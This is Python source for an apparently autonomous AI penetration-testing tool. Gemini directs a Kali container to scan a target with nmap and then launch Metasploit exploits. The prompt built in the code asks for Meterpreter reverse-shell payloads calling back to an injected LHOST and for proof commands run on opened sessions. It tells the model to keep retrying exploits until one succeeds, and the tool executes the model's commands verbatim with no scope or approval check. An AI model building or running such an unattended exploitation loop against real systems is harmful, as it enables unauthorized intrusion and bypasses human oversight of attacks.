import json
import re
import time
from typing import Callable, List, Optional

# from crewai import Crew, Task
from google import genai
from pydantic import BaseModel, Field

from app.agents.exploit_db import get_exploits_for_service
from app.agents.mission_exceptions import MissionCancelled  # noqa: F401 (re-export)
from app.agents.tester import get_tester_agent
from app.agents.tools import kali_lhost, kali_tool
from app.core.config import settings

# Evidence that a command actually achieved access/execution on the target.
_CONFIRM_PATTERNS = [
    r"session \d+ opened",
    r"meterpreter session \d+ opened",
    r"command shell session \d+ opened",
    r"\buid=\d+\(",                 # output of `id`/`whoami` with uid
    r"backdoor has been spawned",
    r"login successful",
    r"already exploited",           # vsftpd: backdoor port already open = confirmed
    r"code execution",
    r"authenticated",
    r"privilege escalation",
]


gemini_client = genai.Client()

# Gemini free tier allows ~15 requests/min per model. Stay safely under that with a
# client-side throttle, and retry on transient errors (429 rate limit, 503/500 server
# spikes) with backoff instead of letting them fail the mission. ~4.5s spacing => <14/min.
_MIN_SECONDS_BETWEEN_CALLS = 4.5
_MAX_RETRIES = 5
_last_call_ts = 0.0


class DiscoveredService(BaseModel):
    port: int
    service_name: str
    version: str


class InitialScanOutput(BaseModel):
    hosts_up: bool
    services: List[DiscoveredService]


class NextStepDecision(BaseModel):
    action: str = Field(
        description="Possible values:" \
        "'COMPLETED', 'SEARCH_EXPLOIT', 'EXECUTE_ATTACK', or 'NEXT_PORT'"
    )
    target_port: Optional[int]
    specific_command: Optional[str] = Field(
        description="Il comando esatto che il Tester deve eseguire sul terminale"
    )
    reasoning: str = Field(description="Perché il manager ha preso questa decisione")


class NoOpReporter:
    """Default sink: prints logs, persists nothing. Used when running standalone."""

    def log(self, step: str, message: str, status: str = "running") -> None:
        print(
            f"\n[TALOSAI_LOG] [{status.upper()}] {step} -> {message}", flush=True
        )

    def services_discovered(self, services: list) -> None:
        pass

    def finding(self, data: dict) -> None:
        pass

    def port_status(
        self, port: int, status: str, attempts: int, history: list
    ) -> None:
        pass

    def mission_status(self, status: str, error: Optional[str] = None) -> None:
        pass


class HybridOrchestratorV2:
    def __init__(
        self,
        target: str,
        user_prompt: Optional[str] = None,
        reporter=None,
        initial_services: Optional[List[dict]] = None,
        should_cancel: Optional[Callable[[], bool]] = None,
    ):
        self.target = target
        self.local_executor = get_tester_agent()
        self.user_prompt = (
            user_prompt or "Perform a comprehensive structural penetration test."
        )
        self.reporter = reporter or NoOpReporter()
        # When provided (resume), discovery is skipped and these per-port states
        # (each: port, service_name, version, status, attempts, history) are used.
        self.initial_services = initial_services
        # Cooperative cancellation: checked at safe checkpoints (between ports and
        # between attempts). A long in-flight command finishes before the stop takes.
        self._should_cancel = should_cancel or (lambda: False)

    def _emit_log(self, step_name: str, message: str, status: str = "running"):
        self.reporter.log(step_name, message, status)

    def _check_cancel(self) -> None:
        if self._should_cancel():
            raise MissionCancelled()

    @staticmethod
    def _with_lhost(command: str) -> str:
        """Inject `setg LHOST <kali_ip>` into msfconsole commands so reverse
        payloads always validate. The injected command is what gets stored in the
        finding too, so it stays copy-paste reproducible."""
        if "msfconsole" not in command or "LHOST" in command:
            return command
        ip = kali_lhost()
        if not ip:
            return command
        prefix = f"setg LHOST {ip}; "
        new, n = re.subn(
            r'(-x\s+)(["\'])', lambda m: m.group(1) + m.group(2) + prefix,
            command, count=1,
        )
        return new if n else command

    @staticmethod
    def _looks_confirmed(output: str) -> bool:
        """Best-effort: did the command show real access/execution evidence?"""
        text = output or ""
        return any(re.search(p, text, re.IGNORECASE) for p in _CONFIRM_PATTERNS)

    # def _execute_micro_task(
    #     self, command_to_run: str, expected_description: str
    # ) -> str:
    #     micro_task = Task(
    #         agent=self.local_executor,
    #         description=
    #         f"Execute this exact command inside Kali container: {command_to_run}. " \
    #         f"Context: {expected_description}",
    #         expected_output="The raw command-line stdout/stderr output.",
    #     )
    #     crew = Crew(tasks=[micro_task], agents=[self.local_executor], verbose=False)
    #     output = crew.kickoff()
    #     return output.raw if hasattr(output, "raw") else str(output)

    def _execute_micro_task(
            self, command_to_run: str, expected_description: str
        ) -> str:
        self._emit_log("Tester", f"Running directly via Docker: {command_to_run}")
        output = kali_tool._run(command=command_to_run)
        return output

    @staticmethod
    def _parse_retry_delay(message: str, fallback: float = 30.0) -> float:
        # Gemini surfaces the suggested wait either as "Please retry in 30.04s"
        # or as a RetryInfo "retryDelay": "30s" field. Honor whichever is present.
        for pattern in (r"retry in ([\d.]+)s", r"retryDelay'?:\s*'?(\d+(?:\.\d+)?)s"):
            match = re.search(pattern, message)
            if match:
                return float(match.group(1)) + 1.0  # small cushion
        return fallback

    def _generate(self, prompt: str, schema, _retry: int = 0) -> dict:
        global _last_call_ts

        wait = _MIN_SECONDS_BETWEEN_CALLS - (time.monotonic() - _last_call_ts)
        if wait > 0:
            time.sleep(wait)

        try:
            resp = gemini_client.models.generate_content(
                contents=prompt,
                model=settings.GEMINI_MODEL,
                config=genai.types.GenerateContentConfig(
                    response_mime_type="application/json",
                    response_schema=schema,
                ),
            )
            return json.loads(resp.text)
        except Exception as e:
            msg = str(e)
            is_rate_limit = "429" in msg or "RESOURCE_EXHAUSTED" in msg
            is_transient_server = (
                "503" in msg or "UNAVAILABLE" in msg
                or "500" in msg or "INTERNAL" in msg
            )
            if (is_rate_limit or is_transient_server) and _retry < _MAX_RETRIES:
                if is_rate_limit:
                    # 429 carries a precise retryDelay from Google; honor it.
                    delay = self._parse_retry_delay(msg)
                    reason = "rate limit (429)"
                else:
                    # 503/500 carry no retryDelay: exponential backoff 2,4,8,16,32..60s.
                    delay = min(2.0 * (2 ** _retry), 60.0)
                    reason = "transient server error (503/500)"
                self._emit_log(
                    "Manager",
                    f"Gemini {reason}; backing off {delay:.0f}s "
                    f"(retry {_retry + 1}/{_MAX_RETRIES})...",
                )
                time.sleep(delay)
                return self._generate(prompt, schema, _retry=_retry + 1)
            raise
        finally:
            _last_call_ts = time.monotonic()

    def _discover_services(self) -> List[dict]:
        """Run nmap, parse it, and return per-port working state (fresh run)."""
        self._check_cancel()
        self._emit_log(
            "Manager",
            f"Starting initial service discovery scan on {self.target}...",
        )
        raw_nmap_output = self._execute_micro_task(
            command_to_run=f"nmap -sV -sC -F {self.target}",
            expected_description="Initial fast service verification scan.",
        )

        self._emit_log("Manager", "Parsing raw Nmap output with Gemini...")
        parse_prompt = (
            "Analyze this raw Nmap output and extract all active "
            f"services:\n{raw_nmap_output}"
        )
        scan_data = self._generate(parse_prompt, InitialScanOutput)

        services = [
            {
                "port": s["port"],
                "service_name": s["service_name"],
                "version": s["version"],
                "status": "pending",
                "attempts": 0,
                "history": [],
            }
            for s in scan_data.get("services", [])
        ]
        # Persist the port roster immediately so a crash right after discovery
        # still leaves a resumable mission.
        self.reporter.services_discovered(services)
        return services

    def run(self) -> dict:
        self._check_cancel()
        # Resume reuses the persisted roster; a fresh run (or a resume of a
        # mission that crashed before any port was saved) runs discovery.
        if self.initial_services:
            services = self.initial_services
        else:
            services = self._discover_services()

        self._emit_log(
            "Manager",
            f"Discovered {len(services)} services to investigate.",
            "completed",
        )

        for service in services:
            self._check_cancel()
            # Resume: ports already finished are skipped.
            if service.get("status") == "completed":
                continue

            port = service["port"]
            name = service["service_name"]
            version = service["version"]
            history_of_this_port = list(service.get("history") or [])
            attempts = int(service.get("attempts") or 0)

            self._emit_log(
                "Manager",
                f"Investigating Port {port} ({name} - Version: {version})...",
                "running",
            )
            self.reporter.port_status(
                port, "in_progress", attempts, history_of_this_port
            )

            port_completed = False
            while not port_completed and attempts < 5:
                self._check_cancel()
                attempts += 1

                # Consult exploit DB for known vulnerabilities
                known_exploits = get_exploits_for_service(name, version)
                exploit_hint = ""
                if known_exploits:
                    exploit_hint = "\n\nKNOWN EXPLOITS FOR THIS SERVICE (try these in order if automated discovery fails):\n"
                    for module, payload, desc in known_exploits:
                        exploit_hint += f"  - {module} (payload: {payload or 'default'}) - {desc}\n"

                manager_prompt = (
                    f"You are the Lead Pentester managing an attack loop against target {self.target}.\n"  # noqa: E501
                    f"Current Focus -> Port: {port}, Service: {name}, Version: {version}.\n"  # noqa: E501
                    f"What we tried so far on this port:\n{json.dumps(history_of_this_port, indent=2)}\n\n"  # noqa: E501
                    f"Decide the next step. If you found a vulnerability/access point or concluded it is not vulnerable, "  # noqa: E501
                    f"set action to 'NEXT_PORT' or 'COMPLETED'. Otherwise, provide the exact 'specific_command' for the tester.\n"  # noqa: E501
                    f"{exploit_hint}"
                    "\nRules for 'specific_command' (the tester runs it verbatim, and the pentester must be able to copy-paste it to reproduce the finding):\n"  # noqa: E501
                    "- Prefer Metasploit or target-specific automated tools over raw .py/.rb exploitdb scripts.\n"  # noqa: E501
                    "- The command MUST be non-interactive and self-terminating: it must NEVER leave an open shell or console (that hangs the run).\n"  # noqa: E501
                    "- For Metasploit, use exactly this shape:\n"
                    "  msfconsole -q -x \"use <module>; set RHOSTS <ip>; set RPORT <port>; <other options>; run -z; sessions -c id; exit -y\"\n"  # noqa: E501
                    "    * 'run -z' opens the session in the background instead of dropping into an interactive shell.\n"  # noqa: E501
                    "    * 'sessions -c id' proves exploitation by running a command on the opened session and printing its output.\n"  # noqa: E501
                    "    * always finish with 'exit -y' so msfconsole quits.\n"
                    "- RETRY STRATEGY: If your first attempt fails (no session, timeout, or silent failure), try a DIFFERENT exploit from the known list or a DIFFERENT payload. Keep retrying with variants until success or all options exhausted. Do NOT give up after one failure.\n"  # noqa: E501
                    "- Do NOT guess or hardcode a payload name. Let Metasploit use the module's DEFAULT payload (always compatible). If the default is non-interactive (e.g. cmd/unix/reverse_netcat), prefer to set a Meterpreter payload instead (e.g. php/meterpreter/reverse_tcp, cmd/linux/http/x86/meterpreter, linux/x86/meterpreter) to ensure interactive shell support and reliable proof commands. Do not hardcode LHOST unless required; let Metasploit auto-detect the local interface.\n"  # noqa: E501
                    "- Proof of exploitation: ALWAYS include a proof command (id, whoami, pwd, uname) in the sessions -c clause. If sessions -c fails silently, consider the exploit unconfirmed and try a different payload or approach on the next attempt.\n"  # noqa: E501
                )

                decision = self._generate(manager_prompt, NextStepDecision)

                self._emit_log(
                    f"Manager [Port {port}]",
                    f"Decision: {decision['action']} -> {decision['reasoning']}",
                )

                if decision["action"] in ["NEXT_PORT", "COMPLETED"]:
                    port_completed = True
                    continue

                if decision["specific_command"]:
                    # LHOST injected here so BOTH the executed command and the
                    # stored finding command are identical and copy-paste runnable.
                    command = self._with_lhost(decision["specific_command"])
                    cmd_output = self._execute_micro_task(
                        command_to_run=command,
                        expected_description=f"Testing vulnerability on port {port}",  # noqa: E501
                    )

                    history_of_this_port.append(
                        {
                            "command_sent": command,
                            "terminal_output": cmd_output[:2000],
                        }
                    )

                    # Each executed step is a durable finding, pushed live and
                    # persisted the moment it happens.
                    self.reporter.finding(
                        {
                            "port": port,
                            "service_name": name,
                            "action": decision["action"],
                            "command": command,
                            "output": cmd_output[:4000],
                            "reasoning": decision["reasoning"],
                            "confirmed": self._looks_confirmed(cmd_output),
                        }
                    )
                    self.reporter.port_status(
                        port, "in_progress", attempts, history_of_this_port
                    )

            service["status"] = "completed"
            service["attempts"] = attempts
            service["history"] = history_of_this_port
            self.reporter.port_status(
                port, "completed", attempts, history_of_this_port
            )
            self._emit_log(
                "Manager", f"Finished investigation on port {port}.", "success"
            )

        return {"status": "completed", "target": self.target, "services": len(services)}
